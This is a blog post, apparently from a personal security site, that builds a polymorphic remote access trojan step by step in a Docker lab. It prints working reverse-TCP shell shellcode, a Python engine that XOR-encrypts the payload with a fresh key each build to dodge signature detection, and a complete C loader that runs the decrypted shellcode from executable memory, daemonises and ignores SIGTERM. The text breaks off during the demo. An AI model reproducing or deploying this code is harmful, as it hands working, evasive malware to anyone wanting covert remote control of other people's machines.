<!DOCTYPE html>
<html style="height: 100%;" lang="en">
  <head>
    <title>reo</title>
<meta name="description" content="Leop homepage">

<meta property="og:locale" content="en_CA">
<meta property="og:site_name" content="LeoG Homepage">
<meta property="og:title" content="reo">
<meta property="og:url" content="https://reo.github.io/blog">
<meta property="og:type" content="article">
<meta property="og:description" content="on Cryptography, Malware, and Math">
<meta property="og:image" content="https://reo.github.io/assets/images/thumb-small.jpg">
<meta property="og:image:width" content="1199">
<meta property="og:image:height" content="800">

<meta itemprop="name" content="Leogp Blog">
<meta itemprop="url" content="https://reo.github.io/blog">
<meta itemprop="description" content="on Cryptography, Malware, and Math">
<meta itemprop="thumbnailUrl" content="https://reo.github.io/assets/images/thumb-small.jpg">
<link rel="image_src" href="https://reo.github.io/assets/images/thumb-small.jpg">
<meta itemprop="image" content="https://reo.github.io/assets/images/thumb-small.jpg">
<meta itemprop="author" content="Leo">
<meta itemprop="datePublished" content="2021-02-10T10:55:54-0500">
<meta itemprop="dateModified" content="2021-06-21T10:01:18-0500">
<meta itemprop="headline" content="Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math">
<meta itemprop="publisher" content="Leogp">

<meta name="twitter:title" content="Leogp Homepage">
<meta name="twitter:image" content="https://reo.github.io/assets/images/thumb-small.jpg">
<meta name="twitter:url" content="https://reo.github.io/blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math">
<meta name="description" content="">

<link rel="stylesheet" href="/assets/css/main.css">

<script type="application/ld+json">{"name":"Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math","url":"https://reo.github.io/blog","datePublished":"2021-02-10T10:55:54-0500","dateModified":"2021-06-21T10:01:18-0500","headline":"Leogp Homepage \u2014 Blog: on Cryptography, Malware, and Math","author":"Leonardo G.","publisher":{"name":"Self-Published","logo":{"@type":"ImageObject"},"@context":"http://schema.org","@type":"Organization"},"image":"https://reo.github.io/assets/images/thumb-small.jpg","@context":"http://schema.org","@type":"Article"}</script>

<meta charset="utf-8">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">

<meta name="theme-color" content="#000">
<link rel="stylesheet" href="/assets/css/style.css">




  </head>
  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
    <nav id="nav_hp" class="sidenav collapse invert-color">
  <!-- close button div
  <div id="menu" style="display:block; width:100%">
    <a href="javascript:void(0)" class="closebtn hide-large"
				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
				 onclick="close_nav()">&times;</a>
  </div>
  -->
  <!-- items div -->
  <div id="menu" class="sidenav-items" style="display:block; width:100%">
  
  <p><a href="/" >TOP</a></p>
  
  <p><a href="/about.html" >ABOUT</a></p>
  
  <p><a href="/blog.html" >BLOG</a></p>
  
  </div>
</nav>
<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
				title="close side menu" id="overlay"></div>
<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
<script>
	// Open and close sidebar
	function open_nav() {
		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
		document.getElementById("overlay").style.display = "block";
	}
	function close_nav() {
		document.getElementById("nav_hp").style.width = "0px";
		document.getElementById("overlay").style.display = "none";
	}
</script>
<!--
	<p><a href="http://:4000">TOP</a></p>

	
	
	
	
	
	
	
	
	
	
	
-->

    <div class="hp-contents">
      <h2 class="title">Simple Polymorphic RAT by Executing Dynamically Generated Machine Code</h2>
      <div class="-container">
        <div class="-content focus-content">

          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="post-content" itemprop="articleBody">
    <p>We create an RAT malware with a <strong>polymorphic engine</strong> which enables
dodging signature-based detection from anti-malware tools.
This is made possible using encryption techniques and the
ability to execute dynamically generated machine code.
This attack is specifically for linux/macOS but can be
extended to work on Windows as well.
We also demo the attack in action.</p>

<h2 class="no_toc" id="contents">Contents</h2>

<ul id="markdown-toc">
  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
  <li><a href="#executing-machine-code-from-protected-memory" id="markdown-toc-executing-machine-code-from-protected-memory">Executing Machine Code From Protected Memory</a>    <ul>
      <li><a href="#a-first-attempt" id="markdown-toc-a-first-attempt">A First Attempt</a></li>
      <li><a href="#a-more-sophisticated-approach" id="markdown-toc-a-more-sophisticated-approach">A More Sophisticated Approach</a></li>
    </ul>
  </li>
  <li><a href="#making-it-malicious" id="markdown-toc-making-it-malicious">Making it Malicious</a></li>
  <li><a href="#writing-the-polymorphic-engine" id="markdown-toc-writing-the-polymorphic-engine">Writing the Polymorphic Engine</a></li>
  <li><a href="#running-the-obfuscated-shellcode" id="markdown-toc-running-the-obfuscated-shellcode">Running the Obfuscated Shellcode</a></li>
  <li><a href="#demo" id="markdown-toc-demo">Demo</a></li>
</ul>

<p><br /></p>

<hr />

<h2 id="setup">Setup</h2>

<hr />

<p>We set up a network to simulate a connection between a user who unwittingly installs the malware
(Alice) and the malicious user (Mallory).</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>

<span class="na">services</span><span class="pi">:</span>
    
  <span class="na">alice</span><span class="pi">:</span>
      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
      <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
      <span class="na">networks</span><span class="pi">:</span>
        <span class="na">internal</span><span class="pi">:</span>
          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
      <span class="na">cap_add</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
        <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
        
  <span class="na">mallory</span><span class="pi">:</span>
      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
      <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
      <span class="na">cap_add</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
      <span class="na">volumes</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s">.:/shared</span>
      <span class="na">networks</span><span class="pi">:</span>
        <span class="na">internal</span><span class="pi">:</span>
          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>

<span class="na">networks</span><span class="pi">:</span>
  <span class="na">internal</span><span class="pi">:</span>
    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
    <span class="na">ipam</span><span class="pi">:</span>
      <span class="na">config</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
</code></pre></div></div>

<p>we may then start Mallory’s and Alice’s containers</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up -d
</code></pre></div></div>

<p>and interactive sessions with</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it mallory bash
$ docker exec -it alice bash
</code></pre></div></div>

<p>we will want two sessions as Mallory, and one with Alice.</p>

<p><br /></p>

<hr />

<h2 id="executing-machine-code-from-protected-memory">Executing Machine Code From Protected Memory</h2>

<hr />

<p>We will use a technique from a <a href="http://blog.jeff.over.bz/assembly/compilers/jit/2017/03/30/executing-dynamically-generated-machine-code.html">great blog post</a>
which goes over how to execute shellcode directly from memory which would normally be protected.</p>

<p>Suppose we would like to execute the assembly:</p>

<pre><code class="language-asm">mov eax, 12345678h
ret
</code></pre>

<p>in our target <a href="https://en.wikipedia.org/wiki/Machine_code">machine language</a>,
this can be written as the following 6-bytes</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b8 78 56 34 12 c3
</code></pre></div></div>

<p><br /></p>

<hr />

<h3 id="a-first-attempt">A First Attempt</h3>

<hr />

<p>For our first attempt, we may simply try to set a function pointer to the beginning
of an array containing the machine code like</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">uint8_t</span> <span class="n">machine_code</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xC3</span> <span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="o">&amp;</span><span class="n">machine_code</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">result</span> <span class="o">=</span> <span class="n">fn</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"result = %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Attempting to run this, we will promptly be greeted with</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Segmentation fault (core dumped)
</code></pre></div></div>

<p>so what went wrong here? If we recall some of our <a href="">earlier exercises</a>,
we remember that we explicitly had to make the desired section of our stack executable.
This is due to OS protection which, by default, prevents execution of machine code
in regions where it is not expected (for example, our array in the program above).
This may be implemented in various ways one being the <a href="https://en.wikipedia.org/wiki/NX_bit">NX bit</a>.</p>

<p><br /></p>

<hr />

<h3 id="a-more-sophisticated-approach">A More Sophisticated Approach</h3>

<hr />

<p>Our goal then becomes to mark a region of memory as executable and copy the
target machine code to that same space. We start with the required header files and
by allocating a new page of memory:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stddef.h&gt;    // size_t
#include &lt;stdint.h&gt;    // uint8_t, uint32_t
#include &lt;stdio.h&gt;     // printf
#include &lt;string.h&gt;    // memcpy
#include &lt;sys/mman.h&gt;  // mmap, mprotect, munmap, MAP_FAILURE
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
        <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">PAYLOAD</code> will be our encrypted payload.</p>

<p>The prototype for <code class="language-plaintext highlighter-rouge">mmap()</code> is</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
</code></pre></div></div>

<p>Details can be found <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">here</a>
but to summarize:</p>
<ul>
  <li>setting <code class="language-plaintext highlighter-rouge">addr</code> to <code class="language-plaintext highlighter-rouge">NULL</code> has the system choos the address for us</li>
  <li><code class="language-plaintext highlighter-rouge">PROT_READ | WRITE</code> allows the page to be read and written to</li>
  <li><code class="language-plaintext highlighter-rouge">MAP_ANONYMOUS | PRIVATE</code> specifies to zeroize the memory</li>
</ul>

<p>next, we copy our machine code to the allocated space</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">memcpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">));</span>
</code></pre></div></div>

<p>and change the page protections to read+execute</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">mprotect</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mprotect"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>with this we can now execute the shellcode directly from memory
by setting a function pointer to the newly allocated space and
calling it. We can also free the memory after this is done.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">mem</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>

    <span class="c1">// Free the memory</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">munmap</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"munmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
    <span class="p">}</span>
<span class="err">}</span>
</code></pre></div></div>

<p><br /></p>

<hr />

<h2 id="making-it-malicious">Making it Malicious</h2>

<hr />

<p>The experiment we went through becomes quite useful when the payload is shellcode.
For this example, we open a reverse tcp bind shell using shellcode written by
Russell Willis (<a href="https://www.exploit-db.com/exploits/43599">Exploit DB entry</a>):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">PAYLOAD</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x02</span><span class="s">"</span> <span class="n">PORT</span> <span class="s">"</span><span class="se">\xc7\x44\x24\x04</span><span class="s">"</span> <span class="n">IPADDR</span> <span class="s">"</span><span class="se">\x48\x89\xe6\x6a\x10</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x5f\x6a\x3b\x58\x0f\x05</span><span class="s">"</span>
</code></pre></div></div>

<p>however instead of having this in plain sight for signature detection algorithms,
we will obfuscate it with encryption using a very simple polymorphic engine written in python.</p>

<p><br /></p>

<hr />

<h2 id="writing-the-polymorphic-engine">Writing the Polymorphic Engine</h2>

<hr />

<p>Our polymorphic engine will only be used to generate a different-looking malware
for each instance. This is done using
<a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pad</a>
with a simple xor cipher.</p>

<p>The python file here simply creates a header file called <code class="language-plaintext highlighter-rouge">zmalware.h</code>
which contains the enciphered shellcode and corresponding one-time pad key.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span>

<span class="n">IPADDR</span><span class="o">=</span><span class="s">b"</span><span class="se">\x0a\x00\x00\x03</span><span class="s">"</span> <span class="c1"># 10.0.0.3
</span><span class="n">PORT</span><span class="o">=</span><span class="s">b"</span><span class="se">\x01\xbb</span><span class="s">"</span>           <span class="c1"># 443
</span>
<span class="c1"># raw shellcode
</span><span class="n">RAW</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x02</span><span class="s">"</span> <span class="o">+</span> <span class="n">PORT</span> <span class="o">+</span> <span class="s">b"</span><span class="se">\xc7\x44\x24\x04</span><span class="s">"</span> <span class="o">+</span> <span class="n">IPADDR</span> <span class="o">+</span> <span class="s">b"</span><span class="se">\x48\x89\xe6\x6a\x10</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54</span><span class="s">"</span> <span class="o">+</span>\
<span class="s">b"</span><span class="se">\x5f\x6a\x3b\x58\x0f\x05</span><span class="s">"</span>

<span class="c1"># generate a random key
</span><span class="n">KEY</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">RAW</span><span class="p">))</span>

<span class="c1"># create a string of the key to write to the header file
</span><span class="n">KEYstr</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="s">r'\x'</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="k">else</span> <span class="s">r'\x0'</span><span class="p">)</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">b</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">KEY</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"KEY:"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">KEYstr</span><span class="p">)</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="s">b""</span>
<span class="k">for</span> <span class="n">b1</span><span class="p">,</span> <span class="n">b2</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">RAW</span><span class="p">,</span><span class="n">KEY</span><span class="p">):</span>
    <span class="n">ciphertext</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b1</span> <span class="o">^</span> <span class="n">b2</span><span class="p">])</span>

<span class="c1"># create a string of the enciphered payload to write to the header file
</span><span class="n">cipherstr</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="s">r'\x'</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="k">else</span> <span class="s">r'\x0'</span><span class="p">)</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">b</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"ciphertext:"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">cipherstr</span><span class="p">)</span>

<span class="n">include_statements</span> <span class="o">=</span> \
<span class="s">'</span><span class="se">\
</span><span class="s">#include &lt;unistd.h&gt;</span><span class="se">\n\
</span><span class="s">#include &lt;stdio.h&gt;</span><span class="se">\n\
</span><span class="s">#include &lt;signal.h&gt;</span><span class="se">\n\
</span><span class="s">#include &lt;stddef.h&gt;    // size_t</span><span class="se">\n\
</span><span class="s">#include &lt;stdint.h&gt;    // uint8_t, uint32_t</span><span class="se">\n\
</span><span class="s">#include &lt;string.h&gt;    // memcpy</span><span class="se">\n\
</span><span class="s">#include &lt;sys/mman.h&gt;  // mmap, mprotect, munmap, MAP_FAILURE</span><span class="se">\n\n\
</span><span class="s">'</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'malware.h'</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span> <span class="k">as</span> <span class="n">header</span><span class="p">:</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">include_statements</span><span class="p">)</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'unsigned char KEY[] = '</span><span class="p">)</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'"'</span> <span class="o">+</span> <span class="n">KEYstr</span> <span class="o">+</span> <span class="s">'";'</span><span class="p">)</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'unsigned char CYP[] = '</span><span class="p">)</span>
    <span class="n">header</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'"'</span> <span class="o">+</span> <span class="n">cipherstr</span> <span class="o">+</span> <span class="s">'";'</span><span class="p">)</span>

</code></pre></div></div>

<p>Say we call this <code class="language-plaintext highlighter-rouge">engine.py</code>.
This changes for each call so for each different key (as well as IP and PORT) we
have a malware which “looks” different when compiled.</p>

<p>(Note that this is simple for demonstration purposes, most polymorphic code is
also self-replicating and uses more sophisticated methods of obfuscation/encryption).</p>

<p><br /></p>

<hr />

<h2 id="running-the-obfuscated-shellcode">Running the Obfuscated Shellcode</h2>

<hr />

<p>Since the shellcode is encrypted, we cannot simply run it, however, having the key
it is trivial to decipher the shellcode to later execute.</p>

<p>The completed file is as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "malware.h"
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// daemonize and run the process in the background</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">daemon</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>
    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>

    <span class="c1">// allocate the memory</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CYP</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
        <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* decrypt using simple xor cipher with key KEY */</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">plain</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">CYP</span><span class="p">)];</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CYP</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// This allows flexibility for different key sizes</span>
        <span class="n">plain</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CYP</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KEY</span><span class="p">)];</span>
    <span class="p">}</span>
    
    <span class="c1">// Write the now decrypted machine code into the newly allocated page</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">plain</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">));</span>

    <span class="c1">// Change the page protections to read + execute</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mprotect</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mprotect"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// execute the function directly from memory</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">mem</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>

    <span class="c1">// Free the memory</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">munmap</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"munmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>notice that we also made our process run in the background
by daemonizing and ignore <code class="language-plaintext highlighter-rouge">SIGTERM</code> to make it more persistent.</p>

<p><br /></p>

<hr />

<h2 id="demo">Demo</h2>

<hr />

<p>A demo using the docker containers we have open can be done as follows:</p>

<ol>
  <li>Mallory generates a new form of the malware using <code class="language-plaintext highlighter-rouge"># python3 engine.py</code></li>
  <li>Mallory compiles with <code class="language-plaintext highlighter-rouge"># gcc -o fileless fileless.c zmalware.h</code> creating the <code class="language-plaintext highlighter-rouge">fileless</code> executable.</li>
  <li>Mallory listens for connection, say with <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>:
